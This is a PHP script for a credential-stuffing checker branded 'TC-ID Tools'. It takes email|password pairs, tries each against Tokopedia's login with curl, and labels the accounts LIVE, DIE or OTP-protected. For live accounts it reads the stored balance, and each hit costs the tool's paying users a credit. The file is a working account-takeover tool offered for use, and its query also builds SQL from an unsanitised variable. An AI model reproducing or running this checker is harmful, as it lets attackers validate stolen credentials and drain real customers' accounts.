<?php
session_start();
error_reporting(0); 
?>
<?php
// 1: NOTICE, -1: UNCHECK, 2: DIE, 3: BAD/SOCKS DIE, 0: LIVE //
date_default_timezone_set("Asia/Jakarta");
$format = $_POST['mailpass'];
$pisah = explode("|", $format);
$sock = $_POST['sock'];
$hasil = array();

if (!isset($format)) {
header('location: ./');
exit;
}
require 'includes/class_curl.php';
if (isset($format)){
	
	// cek wrong
	if ($pisah[1] == '' || $pisah[1] == null) {
		die('{"error":-1,"msg":"<font color=red><b>UNKNOWN</b></font> | Unable to checking"}');
	}
	
    $curl = new curl();
    $curl->cookies('cookies/'.md5($_SERVER['REMOTE_ADDR']).'.txt');
    $curl->ssl(0, 2);

    $url = "https://accounts.tokopedia.com/authorize?response_type=code&client_id=1001";

	$page = $curl->get($url);

	if ($page) {
                         
		$data = "email={$pisah[0]}&password={$pisah[1]}";
		$page = $curl->post($url, $data);

		if (inStr($page, "Email / Password yang anda masukkan salah.")) {
			die('{"error":2,"msg":"<font color=red><b>DIE</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		} else if (inStr($page, "Keamanan")) {
mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
			die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' | <font color=blue>[Security Check/OTP]</font> | [ACC:TOKOPEDIA] ./TC-ID Tools"}');
		} else if (inStr($page, "Captcha salah. Silahkan coba lagi.")) {
			die('{"error":-1,"msg":"<font color=red><b>CAPTCHA DETECTED</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		} else if (inStr($page, "Aktivasi")) {
			die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' | <font color=blue>[Aktivasi]</font> | [ACC:TOKOPEDIA] ./TC-ID Tools"}');
		} else if (inStr($page, "Akun Anda telah diblokir")) {
			die('{"error":2,"msg":"<font color=red><b>DIE</b></font> | '.$pisah[0].' | '.$pisah[1].' | <font color=red>[Akun di blokir]</font>"}');
		} else if (inStr($page, "Kode OTP")) {
mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
			die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' | <font color=blue>[OTP Verification]</font> | [ACC:TOKOPEDIA] ./TC-ID Tools"}');
		} else if (inStr($page, "Profil Saya")) {
$page_saldo = $curl->get('https://www.tokopedia.com/ajax/deposit.pl?action=show_dialog_withdraw');
$string_saldo = getStr($page_saldo, 'name="total_deposit" value="','"');
      if ($string_saldo == null) {
        $saldo = "<font color=green>Saldo : Rp 0</font>";
      } else {
        $saldo = "<font color=green>Saldo : $string_saldo</font>";
      }
mysql_query("UPDATE `user` SET `credits`=credits-1 WHERE email='$email'");
			die('{"error":0,"msg":"<font color=green><b>LIVE</b></font> | '.$pisah[0].' | '.$pisah[1].' | ['.$saldo.'] | [ACC:TOKOPEDIA] ./TC-ID Tools"}');
		} else {
			die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].'"}');
		}
	} else {
		die('{"error":-1,"msg":"<font color=red><b>UNCHECK</b></font> | '.$pisah[0].' | '.$pisah[1].' | Unable To Connect tokopedia.com"}');
	}
}
?>